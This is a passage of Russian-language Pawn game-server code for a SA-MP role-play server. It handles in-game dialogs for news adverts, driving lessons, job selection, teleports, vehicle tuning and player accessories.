			new plid = strval(inputtext);
			if(!IsPlayerConnected(plid) || plid == INVALID_PLAYER_ID)
			{
			    SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
			    ShowPlayerDialog(playerid, 2231, DIALOG_STYLE_INPUT, "Завершить интервью", "Введите ид игрока для завершения интвервью", "Далее", "Назад");
				return true;
			}
			if(GetDistanceBetweenPlayerss(playerid, plid) > 5)
		 	{
			 	SCM(playerid, COLOR_GREY, " Игрок слишком далеко!");
			 	ShowPlayerDialog(playerid, 2231, DIALOG_STYLE_INPUT, "Завершить интервью", "Введите ид игрока для завершения интвервью", "Далее", "Назад");
				return true;
		 	}
		 	switch(PlayerInfo[playerid][pMember])
		 	{
		 	    case 9: TalkingLive[plid] = 255;
		 	    case 16:TalkingLivels[plid] = 255;
		 	    case 20:TalkingLivelv[plid] = 255;
    		}
    		SCM(playerid, -1, " Он вышёл из прямого эфира");
    		SCM(plid, -1, " Вы вышли из прямого эфира");
    		CallLocalFunction("OnPlayerCommandText", "is", playerid, "/n");
    		return true;
	    }
	case 8454:
	    {
	        if(!response) return true;
	        // LS News 9
	        TOTALADVERT[0]++;
	        new i = TOTALADVERT[0];
	        strmid(AdvertInfo[i][0][adName], PlayerInfo[playerid][pName], 0, 50, 50);
			AdvertInfo[i][0][adPhone] = PlayerInfo[playerid][pPnumber];
			strmid(AdvertInfo[i][0][adText], ReportQ[playerid], 0, 144, 144);
			AdvertInfo[i][0][edited] = false;
			SCM(playerid, -1, " Ваше объявление будет подано после проверки");
			format(YCMDstr,sizeof(YCMDstr)," Добавлено новое объявление от %s", Name(playerid));
			SendFamilyMessage(9,0xb953aa,YCMDstr);
			AdvertTime = gettime() + 15;
			format(string, sizeof(string), "~r~-$%i",(strlen(ReportQ[playerid])*addd[1]));
			GameTextForPlayer(playerid, string, 5000, 1);
			PlayerInfo[playerid][pCash] -= (strlen(ReportQ[playerid])*addd[1]);
	    }
   	case 8455:
	    {
	        if(!response) return true;
	        // SF News 16
	        TOTALADVERT[1]++;
	        new i = TOTALADVERT[1];
	        strmid(AdvertInfo[i][1][adName], PlayerInfo[playerid][pName], 0, 50, 50);
			AdvertInfo[i][1][adPhone] = PlayerInfo[playerid][pPnumber];
			strmid(AdvertInfo[i][1][adText], ReportQ[playerid], 0, 144, 144);
			AdvertInfo[i][1][edited] = false;
			SCM(playerid, -1, " Ваше объявление будет подано после проверки");
			format(YCMDstr,sizeof(YCMDstr)," Добавлено новое объявление от %s", Name(playerid));
			SendFamilyMessage(16,0xb953aa,YCMDstr);
			AdvertTime = gettime() + 15;
			format(string, sizeof(string), "~r~-$%i",(strlen(ReportQ[playerid])*addd[0]));
			GameTextForPlayer(playerid, string, 5000, 1);
			PlayerInfo[playerid][pCash] -= (strlen(ReportQ[playerid])*addd[0]);
	    }
    case 8456:
	    {
	        if(!response) return true;
	        // LV News 20
	        TOTALADVERT[2]++;
	        new i = TOTALADVERT[2];
	        strmid(AdvertInfo[i][2][adName], PlayerInfo[playerid][pName], 0, 50, 50);
			AdvertInfo[i][2][adPhone] = PlayerInfo[playerid][pPnumber];
			strmid(AdvertInfo[i][2][adText], ReportQ[playerid], 0, 144, 144);
			AdvertInfo[i][2][edited] = false;
			SCM(playerid, -1, " Ваше объявление будет подано после проверки");
			format(YCMDstr,sizeof(YCMDstr)," Добавлено новое объявление от %s", Name(playerid));
			SendFamilyMessage(20,0xb953aa,YCMDstr);
			AdvertTime = gettime() + 15;
			format(string, sizeof(string), "~r~-$%i",(strlen(ReportQ[playerid])*addd[2]));
			GameTextForPlayer(playerid, string, 5000, 1);
			PlayerInfo[playerid][pCash] -= (strlen(ReportQ[playerid])*addd[2]);
	    }
	case 10093:
	    {
			if(!response) return true;
			{
				new teleport[] = "[0] LSPD [key:1]\n[1] LSPD-Тюрьма [key:2]\n[2] Мэрия [key:3]\n[3] Автовокзал ЛС [key:4]\n[4] ЛС-СФ Шоссе [key:5]\n[5] Автошкола [key:6]\n[6] ФБР [key:7]\n[7] Аэропорт СФ [key:8]\n[8] Аэропорт ЛС [key:9]\n[9] Военная база [key:10]\n[10] Цент Лас Вентурас [key:11]\n[11] Клуб Джизи [key:12]\n[12] Админ казино [key:13]\n[13] Вокзал ЛВ [key:14]\n[14] Аэро ЛС Въезд [key:15]\n[15] Вокзал СФ [key:16]\n[16] Авианосец стоянка [key:17]\n[17] Авианосец [key:18]\n>> След.страница";
				ShowPlayerDialogEx(playerid,9000,DIALOG_STYLE_LIST, "Меню",teleport, "Выбрать", "Назад");
			}
		}
	case 10092:
		{
			if(!response) return true;
			useguns[playerid] = 1;
			ShowPlayerDialogEx(playerid, 10098, DIALOG_STYLE_LIST, "Выберите работу", " Водитель автобуса (( с 2лвл ))\n Таксист (( с 2лвл ))\n Продавец хот догов (( с 2лвл ))\n Развозчик продуктов (( с 3лвл ))\n Механик (( с 3лвл ))\n Прораб (( с 5лвл ))\n Тренер (( с 6лвл ))\n Дальнобойщик (( с 6лвл ))", "Устроится", "Выйти");
			return true;
		}
	case 70:
		{
			if(!response) return true;
			for(new i = 1; i <= TotalHouse; i++)
			{
				if (PlayerToPoint(3, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]))
				{
					if (GetPlayerVirtualWorld(playerid) == i+50)
					{
						SetPlayerInterior(playerid,0);
						SetPlayerVirtualWorld(playerid,0);
						SetPlayerPos(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
						return true;
					}
				}
			}
		}
	case 10022:
		{
			if(response)
			{
				format(string,300, "Ваш урок начат. Пройдите на парковку автошколы и сядьте в свободную машину.\nДалее вам будет показан маршрут, по котрому вы должны будете проехать\nЕсли во время экзамена автомобиль попадет в аварию, экзамен будет завершен");
				ShowPlayerDialogEx(playerid,10023,DIALOG_STYLE_MSGBOX, "Экзамен по вождению",string, "Готово", "Отмена");
			}
			else
			{
				return true;
			}
		}
	case 10023:
		{
			if(response)
			{
				if(PlayerInfo[playerid][pQuestL] == 1 && PlayerInfo[playerid][pQuest] == 2)
				{
					GameTextForPlayer(playerid, "~r~-$0", 5000, 1);
					LessonStat[playerid] = 0;
					LessonCar[playerid] = 1;
					TakingLesson[playerid] = 1;
					SetPlayerRaceCheckpoint(playerid, 1, -2077.2729,-92.4760,34.1641,-2077.2729,-92.4760,35.1641, 6.0);
					return true;
				}
				else
				{
					if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid, COLOR_GREY, " Не достаточно денег!");
					GameTextForPlayer(playerid, "~r~-$500", 5000, 1);
					PlayerInfo[playerid][pCash]-= 500;
					LessonStat[playerid] = 0;
					LessonCar[playerid] = 1;
					TakingLesson[playerid] = 1;
					SetPlayerRaceCheckpoint(playerid, 1, -2077.2729,-92.4760,34.1641,-2077.2729,-92.4760,35.1641, 6.0);
					mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
	                mysql_function_query(DATABASE,QUERY,false,"","");
					return true;
				}
			}
			else
			{
				return true;
			}
		}
	case 11516:
		{
			if(response)
			{
				taxiexpp[GetPVarInt(playerid, "Taxist")] ++;
				DeletePVar(playerid, "Taxist");
			}
			else
			{
				DeletePVar(playerid, "Taxist");
			}
		}
	case 8004:
		{
			if(response)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				switch(listitem)
				{
				case 0: ShowPlayerDialogEx(playerid, 8011, 2, "Список дисков", "Shadow\nMega\nWires\nClassic\nRimshine\nCutter\nTwist\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic", "OK", "Назад");
				case 1: AddVehicleComponent(vehicleid,1087), PlayerPlaySound(playerid,1133,0.0,0.0,0.0), ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски\nГидравлика\nАрхангел Тюнинг\nЦвет\nВинилы ", "Выбрать", "Назад");
				case 2:
					{
						new Car = GetPlayerVehicleID(playerid), Model = GetVehicleModel(Car);
						switch(Model)
						{
						case 559,560,561,562,565: ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "Выбрать", "Назад");
						default: SCM(playerid,-1, " Вы должны быть в: Elegy, Stratum, Flash, Sultan, Uranus");
						}
					}
				case 3: ShowPlayerDialogEx(playerid, 8013, 2, "Выбор цвета", "Красный\nГолубой\nЖелтый\nЗеленый\nСерый\nОранжевый\nЧерный\nБелый", "Выбрать", "Назад");
				case 4: ShowPlayerDialogEx(playerid, 8014, 2, "Выбор винила", "Винил №1\nВинил №2\nВинил №3", "Выбрать", "Назад");
				case 5: ShowPlayerDialogEx(playerid, 8015, 2, "Выбор азота", "Азот 2X\nАзот 5X\nАзот 10X", "Выбрать", "Назад");
				}
			}
			else
			return true;
		}
	case 313:
		{
			new playa = GetPVarInt(playerid,"ID");
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 2)) RemovePlayerAttachedObject(playa, 2);
						SetPlayerAttachedObject(playa,2,19137,2,0.100000,0.000000,0.000000,0.000000,0.000000,0.000000,1.000000,1.000000,1.000000);
						return 1;
					}
				case 1:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 7)) RemovePlayerAttachedObject(playa, 7);
						SetPlayerAttachedObject(playa,7, 19270, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
				case 2:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 4)) RemovePlayerAttachedObject(playa, 4);
						SetPlayerAttachedObject(playa,4, 18646, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
				case 3:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 7)) RemovePlayerAttachedObject(playa, 7);
						SetPlayerAttachedObject(playa,7, 19163, 2, 0.111052, 0.021643, -0.000846, 100.280899, 100.752510, 445.071044, 1.100000, 1.300000, 1.300000);
						return 1;
					}
				case 4:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0)) RemovePlayerAttachedObject(playa, 0);
						SetPlayerAttachedObject(playa,0, 18915, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
				case 5:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0)) RemovePlayerAttachedObject(playa, 0);
						SetPlayerAttachedObject(playa,0, 18912, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
				case 6:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0)) RemovePlayerAttachedObject(playa, 0);
						SetPlayerAttachedObject(playa,0, 18916, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
				case 7:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0)) RemovePlayerAttachedObject(playa, 0);
						SetPlayerAttachedObject(playa,0, 18917, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
				case 8:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0)) RemovePlayerAttachedObject(playa, 0);
						SetPlayerAttachedObject(playa,0, 18918, 2, 0.1, 0.03, -0.005, 90.0, 180.0, 90.0);
						return 1;
					}
				case 9:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 4)) RemovePlayerAttachedObject(playa, 4);
						SetPlayerAttachedObject(playa,4, 3528, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 0.100000, 0.100000, 0.100000);
						return 1;
					}
				case 10:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 4)) RemovePlayerAttachedObject(playa, 4);
						SetPlayerAttachedObject(playa,4, 18643, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
				case 11:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0) || IsPlayerAttachedObjectSlotUsed(playa, 1) || IsPlayerAttachedObjectSlotUsed(playa, 4))
						{
							RemovePlayerAttachedObject(playa, 0);
							RemovePlayerAttachedObject(playa, 1);
							RemovePlayerAttachedObject(playa, 4);
						}
						SetPlayerAttachedObject(playa,0, 18693, 5, 1.983503, 1.558882, -0.129482, 86.705787, 308.978118, 268.198822, 1.500000, 1.500000, 1.500000);
						SetPlayerAttachedObject(playa,1, 18693, 6, 1.983503, 1.558882, -0.129482, 86.705787, 308.978118, 268.198822, 1.500000, 1.500000, 1.500000);
						SetPlayerAttachedObject(playa,4, 18965, 2, 0.111052, 0.021643, -0.000846, 92.280899, 92.752510, 358.071044, 1.200000, 1.283168, 1.200000);
						return 1;
					}
				case 12:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 7)) RemovePlayerAttachedObject(playa, 7);
						SetPlayerAttachedObject(playa,7, 19078, 1, 0.329150, -0.072101, 0.156082, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
						return 1;
					}
				case 13:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 7)) RemovePlayerAttachedObject(playa, 7);
						SetPlayerAttachedObject(playa,7, 354, 1, 0.329150, -0.072101, 0.156082, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
						return 1;
					}
				case 14:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 1)) RemovePlayerAttachedObject(playa, 1);
						SetPlayerAttachedObject(playa,1, 356, 6, 0.013610, -0.021393, -0.144862, 2.354303, 354.413848, 0.219168, 3.034477, 3.000000, 3.000000);
						return 1;
					}
				case 15:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 1)) RemovePlayerAttachedObject(playa, 1);
						SetPlayerAttachedObject(playa,1, 19086, 8, -0.049768, -0.014062, -0.108385, 87.458297, 263.478149, 184.123764, 0.622413, 1.041609, 1.012785);
						return 1;
					}
				case 16:
					{
						if(IsPlayerAttachedObjectSlotUsed(playa, 0)) RemovePlayerAttachedObject(playa, 0);
						SetPlayerAttachedObject(playa,0, 19078, 1, -1.097527, -0.348305, -0.008029, 0.000000, 0.000000, 0.000000, 8.073966, 8.073966, 8.073966);
						return 1;
					}
				case 17:
					{
						RemovePlayerAttachedObject(playa, 0);
						RemovePlayerAttachedObject(playa, 1);
						RemovePlayerAttachedObject(playa, 2);
						RemovePlayerAttachedObject(playa, 3);
						RemovePlayerAttachedObject(playa, 4);
						RemovePlayerAttachedObject(playa, 5);
						RemovePlayerAttachedObject(playa, 6);
						RemovePlayerAttachedObject(playa, 7);
						RemovePlayerAttachedObject(playa, 8);
						RemovePlayerAttachedObject(playa, 9);
						return 1;
					}
				}
			}
		}
	case 8011:
		{
			if(response)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				switch(listitem)
				{
				case 0: AddVehicleComponent(vehicleid,1073);
				case 1: AddVehicleComponent(vehicleid,1074);
				case 2: AddVehicleComponent(vehicleid,1076);
				case 3: AddVehicleComponent(vehicleid,1077);
				case 4: AddVehicleComponent(vehicleid,1075);
				case 5: AddVehicleComponent(vehicleid,1079);
				case 6: AddVehicleComponent(vehicleid,1078);
				case 7: AddVehicleComponent(vehicleid,1080);
				case 8: AddVehicleComponent(vehicleid,1081);
				case 9: AddVehicleComponent(vehicleid,1082);
				case 10: AddVehicleComponent(vehicleid,1083);
				case 11: AddVehicleComponent(vehicleid,1084);
				case 12: AddVehicleComponent(vehicleid,1085);
				}
				PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
				ShowPlayerDialogEx(playerid, 8011, 2, "Список дисков", "Shadow\nMega\nWires\nClassic\nRimshine\nCutter\nTwist\nSwitch\nGrove\nImport\nDollar\nTrance\nAtomic", "OK", "Назад");
			}
			else ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски \nГидравлика \nАрхангел Тюнинг \nЦвет \nВинилы ", "Выбрать", "Назад");
		}
	case 8013:
		{
			if(response)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				switch(listitem)
				{
				case 0: ChangeVehicleColor(vehicleid, 3, 3);
				case 1: ChangeVehicleColor(vehicleid, 79, 79);
				case 2: ChangeVehicleColor(vehicleid, 65, 65);
				case 3: ChangeVehicleColor(vehicleid, 86, 86);
				case 4: ChangeVehicleColor(vehicleid, 9, 9);
				case 5: ChangeVehicleColor(vehicleid, 6, 6);
				case 6: ChangeVehicleColor(vehicleid, 0, 0);
				case 7: ChangeVehicleColor(vehicleid, 1, 1);
				}
				PlayerPlaySound(playerid,1134,0.0,0.0,0.0);
				ShowPlayerDialogEx(playerid, 8013, 2, "Выбор цвета", "Красный \nГолубой \nЖелтый \nЗеленый \nСерый \nОранжевый \nЧерный \nБелый", "Готово", "Назад");
			}
			else ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски \nГидравлика \nАрхангел Тюнинг \nЦвет \nВинилы ", "Выбрать", "Назад");
		}
	case 8015:
		{
			if(response)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				switch(listitem)
				{
				case 0:
					{
						AddVehicleComponent(vehicleid,1008);
						ShowPlayerDialogEx(playerid, 8015, 2, "Выбор винила", "Азот 2X \nАзот 5X \nАзот 10X ", "Готово", "Назад");
					}
				case 1:
					{
						AddVehicleComponent(vehicleid,1009);
						ShowPlayerDialogEx(playerid, 8015, 2, "Выбор винила", "Азот 2X \nАзот 5X \nАзот 10X ", "Готово", "Назад");
					}
				case 2:
					{
						AddVehicleComponent(vehicleid,1010);
						ShowPlayerDialogEx(playerid, 8015, 2, "Выбор винила", "Азот 2X \nАзот 5X \nАзот 10X ", "Готово", "Назад");
					}
				}
			}
			else ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски \nГидравлика \nАрхангел Тюнинг \nЦвет \nВинилы \nАзот", "Выбрать", "Назад");
		}
	case 8014:
		{
			if(response)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				ChangeVehiclePaintjob(vehicleid,listitem+1);
				PlayerPlaySound(playerid,1134,0.0,0.0,0.0);
				ShowPlayerDialogEx(playerid, 8014, 2, "Выбор винила", "Винил №1 \nВинил №2 \nВинил №3 ", "Готово", "Назад");
			}
			else ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски \nГидравлика \nАрхангел Тюнинг \nЦвет \nВинилы ", "Выбрать", "Назад");
		}
	case 8012:
		{
			if(response)
			{
				new vehicleid = GetPlayerVehicleID(playerid);
				new cartype = GetVehicleModel(vehicleid);
				switch(listitem)
				{
				case 0:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1172);
						case 560: AddVehicleComponent(vehicleid,1170);
						case 565: AddVehicleComponent(vehicleid,1152);
						case 559: AddVehicleComponent(vehicleid,1173);
						case 561: AddVehicleComponent(vehicleid,1157);
						case 558: AddVehicleComponent(vehicleid,1165);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 1:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1171);
						case 560: AddVehicleComponent(vehicleid,1169);
						case 565: AddVehicleComponent(vehicleid,1153);
						case 559: AddVehicleComponent(vehicleid,1160);
						case 561: AddVehicleComponent(vehicleid,1155);
						case 558: AddVehicleComponent(vehicleid,1166);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 2:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1148);
						case 560: AddVehicleComponent(vehicleid,1140);
						case 565: AddVehicleComponent(vehicleid,1151);
						case 559: AddVehicleComponent(vehicleid,1161);
						case 561: AddVehicleComponent(vehicleid,1156);
						case 558: AddVehicleComponent(vehicleid,1167);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 3:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1149);
						case 560: AddVehicleComponent(vehicleid,1141);
						case 565: AddVehicleComponent(vehicleid,1150);
						case 559: AddVehicleComponent(vehicleid,1159);
						case 561: AddVehicleComponent(vehicleid,1154);
						case 558: AddVehicleComponent(vehicleid,1168);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 4:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1146);
						case 560: AddVehicleComponent(vehicleid,1139);
						case 565: AddVehicleComponent(vehicleid,1050);
						case 559: AddVehicleComponent(vehicleid,1158);
						case 561: AddVehicleComponent(vehicleid,1160);
						case 558: AddVehicleComponent(vehicleid,1163);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 5:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1147);
						case 560: AddVehicleComponent(vehicleid,1138);
						case 565: AddVehicleComponent(vehicleid,1049);
						case 559: AddVehicleComponent(vehicleid,1162);
						case 561: AddVehicleComponent(vehicleid,1058);
						case 558: AddVehicleComponent(vehicleid,1164);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 6:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1041), AddVehicleComponent(vehicleid,1039);
						case 560: AddVehicleComponent(vehicleid,1031), AddVehicleComponent(vehicleid,1030);
						case 565: AddVehicleComponent(vehicleid,1052), AddVehicleComponent(vehicleid,1048);
						case 559: AddVehicleComponent(vehicleid,1070), AddVehicleComponent(vehicleid,1072);
						case 561: AddVehicleComponent(vehicleid,1057), AddVehicleComponent(vehicleid,1063);
						case 558: AddVehicleComponent(vehicleid,1093), AddVehicleComponent(vehicleid,1095);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 7:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1036), AddVehicleComponent(vehicleid,1040);
						case 560: AddVehicleComponent(vehicleid,1026), AddVehicleComponent(vehicleid,1027);
						case 565: AddVehicleComponent(vehicleid,1051), AddVehicleComponent(vehicleid,1047);
						case 559: AddVehicleComponent(vehicleid,1069), AddVehicleComponent(vehicleid,1071);
						case 561: AddVehicleComponent(vehicleid,1056), AddVehicleComponent(vehicleid,1062);
						case 558: AddVehicleComponent(vehicleid,1090), AddVehicleComponent(vehicleid,1094);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 8:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1035);
						case 560: AddVehicleComponent(vehicleid,1033);
						case 565: AddVehicleComponent(vehicleid,1052);
						case 559: AddVehicleComponent(vehicleid,1068);
						case 561: AddVehicleComponent(vehicleid,1061);
						case 558: AddVehicleComponent(vehicleid,1091);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 9:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1038);
						case 560: AddVehicleComponent(vehicleid,1032);
						case 565: AddVehicleComponent(vehicleid,1054);
						case 559: AddVehicleComponent(vehicleid,1067);
						case 561: AddVehicleComponent(vehicleid,1055);
						case 558: AddVehicleComponent(vehicleid,1088);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 10:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1037);
						case 560: AddVehicleComponent(vehicleid,1029);
						case 565: AddVehicleComponent(vehicleid,1045);
						case 559: AddVehicleComponent(vehicleid,1066);
						case 561: AddVehicleComponent(vehicleid,1059);
						case 558: AddVehicleComponent(vehicleid,1089);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				case 11:
					{
						switch(cartype)
						{
						case 562: AddVehicleComponent(vehicleid,1034);
						case 560: AddVehicleComponent(vehicleid,1028);
						case 565: AddVehicleComponent(vehicleid,1046);
						case 559: AddVehicleComponent(vehicleid,1065);
						case 561: AddVehicleComponent(vehicleid,1064);
						case 558: AddVehicleComponent(vehicleid,1092);
						}
						PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
						ShowPlayerDialogEx(playerid, 8012, 2, "Тюнинг Wheel Arch Angels", "Передний бампер X-flow\nПередний бампер Alien\nЗадний бампер X-Flow\nЗадний бампер Alien\nСпойлер X-Flow \nСпойлер Alien \nБоковая юбка X-Flow \nБоковая юбка Alien\nВоздухозаборник X-Flow\nВоздухозаборник Alien\nВыхлоп X-flow\nВыхлоп Alien", "OK", "Назад");
					}
				}
			}
			else ShowPlayerDialogEx(playerid, 8004, 2, "Тюнинг меню", "Диски\nГидравлика\nАрхангел Тюнинг\nЦвет\nВинилы", "Выбрать", "Назад");
			return true;
		}
	case 555:
		{
			if(!response) return true;
			switch(listitem)
			{
			case 0:
				{
					ShowPlayerDialogEx(playerid, 556, DIALOG_STYLE_INPUT, "Выдать водительские права", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			case 1:
				{
					ShowPlayerDialogEx(playerid, 557, DIALOG_STYLE_INPUT, "Выдать лицензию на полёты", "Введите ID того, кому вы хотите выдать лицензию", "Выдать", "Отмена");
					return false;
				}
			case 2:
				{
